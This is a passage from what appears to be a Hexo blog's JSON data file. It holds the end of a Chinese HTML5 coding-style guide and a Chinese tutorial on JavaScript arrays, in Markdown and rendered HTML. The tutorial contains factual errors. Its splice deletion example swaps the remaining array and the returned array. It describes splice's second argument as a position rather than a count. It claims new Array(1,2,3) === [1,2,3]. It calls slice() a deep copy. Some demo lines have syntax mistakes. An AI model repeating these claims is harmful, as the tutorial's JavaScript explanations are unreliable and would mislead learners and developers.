class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">SECTION</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、关闭HTML标签\"><a href=\"#3、关闭HTML标签\" class=\"headerlink\" title=\"3、关闭HTML标签\"></a><a>3、关闭HTML标签</a></h4><ul>\n<li><p><code>双标签：</code> 在 HTML5 中, 你不一定要关闭所有标签 (例如 <code>&lt;p&gt;</code> 标签)，但建议每个标签都要添加关闭标签。<br><strong>不推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。</span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>单标签：</code> 在 HTML5 中, 空的 HTML 标签也不一定要关闭：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 1、可以这么写： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 2、也可以这么写： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在 <code>XHTML</code> 和 <code>XML</code> 中斜线 (/) 是必须的。如果你期望 XML 软件使用你的页面，使用这种风格是非常好的。</p>\n</li>\n</ul>\n<h4 id=\"4、标签的属性名和属性值\"><a href=\"#4、标签的属性名和属性值\" class=\"headerlink\" title=\"4、标签的属性名和属性值\"></a><a>4、标签的属性名和属性值</a></h4><p><strong>HTML5 属性名允许使用大写和小写字母。</strong></p>\n<ul>\n<li><p><code>推荐</code> 使用小写字母属性名:</p>\n<ul>\n<li>同时使用大小写是非常不好的习惯。</li>\n<li>开发人员通常使用小写 (类似 XHTML)。</li>\n<li>小写风格看起来更加清爽。</li>\n<li>小写字母容易编写。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 不推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">CLASS</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>HTML5 属性值可以不用引号</strong></p>\n<ul>\n<li><p>属性值我们 <code>推荐</code> 使用引号：</p>\n<ul>\n<li>如果属性值含有空格需要使用引号。</li>\n<li>混合风格不推荐的，建议统一风格。</li>\n<li>属性值使用引号易于阅读。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 以下实例属性值包含空格，没有使用引号，所以不能起作用: --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">table</span> <span class=\"attr\">striped</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 以下使用了双引号，是正确的： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table striped\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"5、图片属性\"><a href=\"#5、图片属性\" class=\"headerlink\" title=\"5、图片属性\"></a><a>5、图片属性</a></h4><ul>\n<li><p>图片通常使用 <code>alt</code> 属性。 在图片不能显示时，它能替代图片显示：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"html5.gif\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"HTML5\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:128px;height:128px\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>定义好图片的尺寸，在加载时可以预留指定空间，减少闪烁：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"html5.gif\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"HTML5\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:128px;height:128px\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"6、空格和等号\"><a href=\"#6、空格和等号\" class=\"headerlink\" title=\"6、空格和等号\"></a><a>6、空格和等号</a></h4><ul>\n<li><p>等号前后可以使用空格</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span> = <span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span> = <span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>推荐</code> 少用空格</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"7、避免一行代码过长\"><a href=\"#7、避免一行代码过长\" class=\"headerlink\" title=\"7、避免一行代码过长\"></a><a>7、避免一行代码过长</a></h4><ul>\n<li><p>使用 HTML 编辑器，左右滚动代码是不方便的。</p>\n</li>\n<li><p>每行代码尽量少于 <code>80</code> 个字符。</p>\n</li>\n</ul>\n<h4 id=\"8、空行和缩进\"><a href=\"#8、空行和缩进\" class=\"headerlink\" title=\"8、空行和缩进\"></a><a>8、空行和缩进</a></h4><ul>\n<li>不要无缘无故添加空行。</li>\n<li>为每个逻辑功能块添加空行，这样更易于阅读。</li>\n<li>缩进使用两个空格，<code>不建议</code>使用 <code>TAB</code>。</li>\n<li>比较短的代码间不要使用不必要的空行和缩进。</li>\n</ul>\n<h4 id=\"9、省略-lt-html-gt-lt-body-gt-lt-head-gt\"><a href=\"#9、省略-lt-html-gt-lt-body-gt-lt-head-gt\" class=\"headerlink\" title=\"9、省略 &lt;html&gt; &lt;body&gt; &lt;head&gt; ?\"></a><a>9、省略 <code>&lt;html&gt;</code> <code>&lt;body&gt;</code> <code>&lt;head&gt;</code> ?</a></h4><p><strong>在 <code>标准HTML5</code> 中， <code>&lt;html&gt;</code> <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 标签是可以省略的，但我们都 <code>不推荐</code>。</strong></p>\n<ul>\n<li><p>以下写法是正确的：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>页面标题<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>这是一个标题<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>为什么不推荐省略呢？</p>\n<ul>\n<li><p><code>&lt;html&gt;</code> 标签是文档的根标签，用于描述页面的语言：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"zh\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>声明语言是为了方便屏幕阅读器及搜索引擎。</p>\n</li>\n<li>省略 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 在 <code>DOM</code> 和 <code>XML</code> 软件中会崩溃。</li>\n<li>省略 <code>&lt;body&gt;</code> 在旧版浏览器 <code>IE9</code>会发生错误。</li>\n</ul>\n</li>\n<li><p>如果省略 <code>&lt;head&gt;</code> 标签，浏览器会将 <code>&lt;body&gt;</code> 之前的内容添加到一个默认的 <code>&lt;head&gt;</code> 标签上。</p>\n</li>\n</ul>\n<h4 id=\"10、元标签\"><a href=\"#10、元标签\" class=\"headerlink\" title=\"10、元标签\"></a><a>10、元标签</a></h4><ul>\n<li><p><code>HTML5</code> 中 <code>&lt;title&gt;</code> 标签是必须的，标题名描述了页面的主题：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>菜鸟教程<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>标题和语言可以让搜索引擎很快了解你页面的主题：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"zh\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>菜鸟教程<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"11、注释\"><a href=\"#11、注释\" class=\"headerlink\" title=\"11、注释\"></a><a>11、注释</a></h4><ul>\n<li><p>注释可以写在 <!-- 和 --> 中:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 这是注释 --&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>比较长的评论可以在 <!-- 和 --> 中分行写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- </span></span><br><span class=\"line\"><span class=\"comment\">  这是一个较长评论。 这是 一个较长评论。这是一个较长评论。</span></span><br><span class=\"line\"><span class=\"comment\">  这是 一个较长评论 这是一个较长评论。 这是 一个较长评论。</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>长评论第一个字符缩进两个空格，更易于阅读。</p>\n</li>\n</ul>\n<h4 id=\"12、样式表\"><a href=\"#12、样式表\" class=\"headerlink\" title=\"12、样式表\"></a><a>12、样式表</a></h4><ul>\n<li><p>样式表使用简洁的语法格式 ( <code>type</code> 属性不是必须的，在在加载 <code>js</code> 脚本时也可省去)：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>短的规则可以写成一行:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">p</span><span class=\"selector-class\">.into</span> &#123;<span class=\"attribute\">font-family</span>: Verdana; <span class=\"attribute\">font-size</span>: <span class=\"number\">16em</span>;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>长的规则可以写成多行:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: lightgrey;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"Arial Black\"</span>, Helvetica, sans-serif;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">16em</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: black;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>将左花括号与选择器放在同一行。</li>\n<li>左花括号与选择器间添加一个空格。</li>\n<li>使用两个空格来缩进。</li>\n<li>冒号与属性值之间添加一个空格。</li>\n<li>逗号和符号之后使用一个空格。</li>\n<li>每个属性与值结尾都要使用分号。</li>\n<li>只有属性值包含空格时才使用引号。</li>\n<li>右花括号放在新的一行。</li>\n<li>每行最多 80 个字符。</li>\n<li>在逗号和冒号后添加空格是常用的一个规则。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"13、使用小写文件名\"><a href=\"#13、使用小写文件名\" class=\"headerlink\" title=\"13、使用小写文件名\"></a><a>13、使用小写文件名</a></h4><ul>\n<li>大多 Web 服务器 (<code>Apache</code>, <code>Unix</code>) 对大小写敏感： <code>london.jpg</code> 不能通过 <code>London.jpg</code> 访问。</li>\n<li>其他 Web 服务器 (<code>Microsoft</code>, <code>IIS</code>) 对大小写不敏感： <code>london.jpg</code> 可以通过 <code>London.jpg</code> 或 <code>london.jpg</code> 访问。</li>\n<li>你必须保持统一的风格，我们 <code>建议统一使用小写</code> 的文件名。</li>\n</ul>\n<h4 id=\"14、-htm-和-html-的区别\"><a href=\"#14、-htm-和-html-的区别\" class=\"headerlink\" title=\"14、.htm 和 .html 的区别\"></a><a>14、<code>.htm</code> 和 <code>.html</code> 的区别</a></h4><p><strong><code>.htm</code> 和 <code>.html</code> 的扩展名文件本质上是没有区别的。浏览器和 Web 服务器都会把它们当作 <code>HTML</code> 文件来处理。</strong></p>\n<ul>\n<li><p><code>区别在于：</code></p>\n<ul>\n<li><code>.htm</code> 应用在早期 <code>DOS</code> 系统，系统现在或者只能有三个字符。</li>\n<li>在 <code>Unix</code> 系统中后缀没有特别限制，一般用 <code>.html</code>。</li>\n</ul>\n</li>\n<li><p><code>技术上的区别：</code></p>\n<ul>\n<li>如果一个 <code>URL</code> 没有指定文件名 (如 <a href=\"http://www.runoob.com/css/\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/css/</a>), 服务器会返回默认的文件名。通常默认文件名为 <code>index.html</code>, <code>index.htm</code>, <code>default.html</code>, 和 <code>default.htm</code>。</li>\n<li>如果服务器只配置了 <code>index.html</code> 作为默认文件，你必须将文件命名为 <code>index.html</code>, 而不是 <code>index.htm</code>。</li>\n<li>但是，通常服务器可以设置多个默认文件，你可以根据需要设置默认文件名。</li>\n<li><code>无论如何</code>，<code>HTML</code> 完整的后缀是 <code>.html</code>。</li>\n</ul>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"http://www.runoob.com/html/html5-syntax.html\" target=\"_blank\" rel=\"noopener\">runoob</a></p>"},{"id":"0809006","title":"有趣的 javascript 数组","date":"2016-11-27T07:48:26.000Z","_content":"\n#### 关于数组的一些认识\n1. 使用构造器函数创建数组时:\n```javascript\nlet ary = new Array();\n```\n- 若参数只有一个，且为数字，`let ary1 = new Array(3)`，这是其实我们是在指定数组的长度的，即 `ary1.length === 3`。`ary1[0]`则为`undefined`;\n- 当定义`let ary2 = new Array(1, 2, 3)`时，此时`ary2 === [1, 2, 3]`;\n2. JS中的数组定义非常的自由：\n 看下面的例子：\n```javascript\nlet ary = [1, 2, 3];\nary[5] = 5;\nconsole.log(ary);           // [1,2,3,undefined,undefined,5]\nconsole.log(ary.length);    // 6\n```\n 再看：\n```javascript\nlet ary2 = [1, 2, 3, 4, 5];\nary2.length = 3;\nconsole.log(ary2);      // [1, 2, 3]\n```\n#### 常用的数组API\n1. 万能方法 `splice()`\n-  splice()方法允许我们对数组进行插入、替换和删除的功能。**splice方法返回一个有删除元素组成的新数组，没有删除时则返回一个空数组**，简直完美呀！\n- `splice()`方法接受三个参数，**第一个**为开始索引，**第二个**为删除元素的位置，**第三个**为插入的元素，可以为第二个，当然也可省略（表示删除元素）。\n- `splice()`方法会修改原数组！\n- 通过以下三个demo了解一下具体的用法吧：\n插入:\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,0,\"add1\");\nconsole.log(ary1);      [ 'first', 'add1', 'second', 'third', 'forth', 'fifth' ]\nconsole.log(ary2);      [] 没有删除则放回一个空数组\n```\n替换：\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,1,\"replace\");\nconsole.log(ary1);      [ 'first', \"replace, 'third', 'forth', 'fifth' ]\nconsole.log(ary2);      [\"second\"] 返回被删除(即替换)的数组\n```\n删除：\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,3);\nconsole.log(ary1);      [\"second\", \"third\", \"forth\"]\nconsole.log(ary2);      [\"first\", \"fifth\"]\n```\n2. `slice()` 方法\n- `slice()` 方法可以接受两个参数(start, end)；\n- `slice()` 方法可从已有的数组中返回选定的元素；\n- `slice()` 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分；\n- `slice()` 方法**不会改变原始数组**，而是返回一个新数组。\ndemo1:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nconsole.log (ary.slice(1,2) );      // [\"second\"]\nlet ary1 = ary.slice(1,2);          // [\"second\"]\nlet ary2 = ary.slice(1,3);          // [\"second\", \"third\"]\nconsole.log(ary);                   // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n```\ndemo2:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nconsole.log(ary.slice(1,2));    // [\"second\"]\nconsole.log(ary.slice(1,3));    // [\"second\", \"third\"]\nconsole.log(ary));              // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n```\ndemo3:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary1 = ary.slice();     // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary.slice(0);     // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n\nary === ary1;       // false\nary === ary2;       // false\nary1 === ary2;      // false\n```\n**看出来啥猫腻没，这不是深复制一个数据吗！**","source":"_posts/0809006_有趣JavaScript数组.md","raw":"---\nid: 0809006\ntitle: 有趣的 javascript 数组\ndate: 2016-11-27 15:48:26\ntags: \n    - JavaScript\ncategories:\n---\n\n#### 关于数组的一些认识\n1. 使用构造器函数创建数组时:\n```javascript\nlet ary = new Array();\n```\n- 若参数只有一个，且为数字，`let ary1 = new Array(3)`，这是其实我们是在指定数组的长度的，即 `ary1.length === 3`。`ary1[0]`则为`undefined`;\n- 当定义`let ary2 = new Array(1, 2, 3)`时，此时`ary2 === [1, 2, 3]`;\n2. JS中的数组定义非常的自由：\n 看下面的例子：\n```javascript\nlet ary = [1, 2, 3];\nary[5] = 5;\nconsole.log(ary);           // [1,2,3,undefined,undefined,5]\nconsole.log(ary.length);    // 6\n```\n 再看：\n```javascript\nlet ary2 = [1, 2, 3, 4, 5];\nary2.length = 3;\nconsole.log(ary2);      // [1, 2, 3]\n```\n#### 常用的数组API\n1. 万能方法 `splice()`\n-  splice()方法允许我们对数组进行插入、替换和删除的功能。**splice方法返回一个有删除元素组成的新数组，没有删除时则返回一个空数组**，简直完美呀！\n- `splice()`方法接受三个参数，**第一个**为开始索引，**第二个**为删除元素的位置，**第三个**为插入的元素，可以为第二个，当然也可省略（表示删除元素）。\n- `splice()`方法会修改原数组！\n- 通过以下三个demo了解一下具体的用法吧：\n插入:\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,0,\"add1\");\nconsole.log(ary1);      [ 'first', 'add1', 'second', 'third', 'forth', 'fifth' ]\nconsole.log(ary2);      [] 没有删除则放回一个空数组\n```\n替换：\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,1,\"replace\");\nconsole.log(ary1);      [ 'first', \"replace, 'third', 'forth', 'fifth' ]\nconsole.log(ary2);      [\"second\"] 返回被删除(即替换)的数组\n```\n删除：\n```javascript\nlet ary1 = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary1.splice(1,3);\nconsole.log(ary1);      [\"second\", \"third\", \"forth\"]\nconsole.log(ary2);      [\"first\", \"fifth\"]\n```\n2. `slice()` 方法\n- `slice()` 方法可以接受两个参数(start, end)；\n- `slice()` 方法可从已有的数组中返回选定的元素；\n- `slice()` 方法可提取字符串的某个部分，并以新的字符串返回被提取的部分；\n- `slice()` 方法**不会改变原始数组**，而是返回一个新数组。\ndemo1:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nconsole.log (ary.slice(1,2) );      // [\"second\"]\nlet ary1 = ary.slice(1,2);          // [\"second\"]\nlet ary2 = ary.slice(1,3);          // [\"second\", \"third\"]\nconsole.log(ary);                   // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n```\ndemo2:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nconsole.log(ary.slice(1,2));    // [\"second\"]\nconsole.log(ary.slice(1,3));    // [\"second\", \"third\"]\nconsole.log(ary));              // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n```\ndemo3:\n```javascript\nlet ary = [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary1 = ary.slice();     // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\nlet ary2 = ary.slice(0);     // [\"first\", \"second\", \"third\", \"forth\", \"fifth\"];\n\nary === ary1;       // false\nary === ary2;       // false\nary1 === ary2;      // false\n```\n**看出来啥猫腻没，这不是深复制一个数据吗！**","slug":"0809006_有趣JavaScript数组","published":1,"updated":"2018-03-27T03:31:39.389Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtw000ls4c0y28l5p7g","content":"<h4 id=\"关于数组的一些认识\"><a href=\"#关于数组的一些认识\" class=\"headerlink\" title=\"关于数组的一些认识\"></a>关于数组的一些认识</h4><ol>\n<li>使用构造器函数创建数组时:<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>若参数只有一个，且为数字，<code>let ary1 = new Array(3)</code>，这是其实我们是在指定数组的长度的，即 <code>ary1.length === 3</code>。<code>ary1[0]</code>则为<code>undefined</code>;</li>\n<li>当定义<code>let ary2 = new Array(1, 2, 3)</code>时，此时<code>ary2 === [1, 2, 3]</code>;</li>\n</ul>\n<ol>\n<li><p>JS中的数组定义非常的自由：<br>看下面的例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\">ary[<span class=\"number\">5</span>] = <span class=\"number\">5</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary);           <span class=\"comment\">// [1,2,3,undefined,undefined,5]</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary.length);    <span class=\"comment\">// 6</span></span><br></pre></td></tr></table></figure>\n<p>再看：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> ary2 = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\">ary2.length = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(ary2);      <span class=\"comment\">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"常用的数组API\"><a href=\"#常用的数组API\" class=\"headerlink\" title=\"常用的数组API\"></a>常用的数组API</h4><ol>\n<li>万能方法 